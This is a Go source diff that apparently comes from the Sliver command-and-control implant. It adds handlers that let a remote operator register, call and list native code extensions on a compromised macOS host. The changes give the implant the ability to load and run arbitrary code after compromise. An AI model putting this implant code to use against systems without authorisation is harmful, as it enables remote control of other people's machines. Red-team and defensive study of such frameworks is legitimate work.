@@ -31,10 +31,12 @@ import (
 	"time"
 	"unsafe"
 
+	"github.com/bishopfox/sliver/implant/sliver/extension"
 	"github.com/bishopfox/sliver/implant/sliver/procdump"
 	"github.com/bishopfox/sliver/implant/sliver/taskrunner"
 	"github.com/bishopfox/sliver/protobuf/commonpb"
 	"github.com/bishopfox/sliver/protobuf/sliverpb"
+	pb "github.com/bishopfox/sliver/protobuf/sliverpb"
 	"google.golang.org/protobuf/proto"
 
 	// {{if .Config.Debug}}
@@ -72,6 +74,11 @@ var (
 		sliverpb.MsgSSHCommandReq:  runSSHCommandHandler,
 		sliverpb.MsgProcessDumpReq: dumpHandler,
 		sliverpb.MsgGrepReq:        grepHandler,
+
+		// Extensions
+		pb.MsgRegisterExtensionReq: registerExtensionHandler,
+		pb.MsgCallExtensionReq:     callExtensionHandler,
+		pb.MsgListExtensionsReq:    listExtensionsHandler,
 
 		// Wasm Extensions - Note that execution can be done via a tunnel handler
 		sliverpb.MsgRegisterWasmExtensionReq:   registerWasmExtensionHandler,
@@ -443,5 +450,72 @@ func chownHandler(data []byte, resp RPCResponse) {
 
 finished:
 	data, err = proto.Marshal(chown)
+	resp(data, err)
+}
+
+// Extensions
+
+func registerExtensionHandler(data []byte, resp RPCResponse) {
+	registerReq := &pb.RegisterExtensionReq{}
+
+	err := proto.Unmarshal(data, registerReq)
+	if err != nil {
+		return
+	}
+
+	ext := extension.NewDarwinExtension(registerReq.Data, registerReq.Name, registerReq.OS, registerReq.Init)
+	extension.Add(ext)
+	err = ext.Load()
+	registerResp := &pb.RegisterExtension{
+		Response: &commonpb.Response{},
+	}
+	if err != nil {
+		registerResp.Response.Err = err.Error()
+	}
+	data, err = proto.Marshal(registerResp)
+	resp(data, err)
+}
+
+func callExtensionHandler(data []byte, resp RPCResponse) {
+	callReq := &pb.CallExtensionReq{}
+
+	err := proto.Unmarshal(data, callReq)
+	if err != nil {
+		return
+	}
+
+	callResp := &pb.CallExtension{
+		Response: &commonpb.Response{},
+	}
+	gotOutput := false
+	err = extension.Run(callReq.Name, callReq.Export, callReq.Args, func(out []byte) {
+		gotOutput = true
+		callResp.Output = out
+		data, err = proto.Marshal(callResp)
+		resp(data, err)
+	})
+	// Only send back synchronously if there was an error
+	if err != nil || !gotOutput {
+		if err != nil {
+			callResp.Response.Err = err.Error()
+		}
+		data, err = proto.Marshal(callResp)
+		resp(data, err)
+	}
+}
+
+func listExtensionsHandler(data []byte, resp RPCResponse) {
+	lstReq := &pb.ListExtensionsReq{}
+	err := proto.Unmarshal(data, lstReq)
+	if err != nil {
+		return
+	}
+
+	exts := extension.List()
+	lstResp := &pb.ListExtensions{
+		Response: &commonpb.Response{},
+		Names:    exts,
+	}
+	data, err = proto.Marshal(lstResp)
 	resp(data, err)
 }
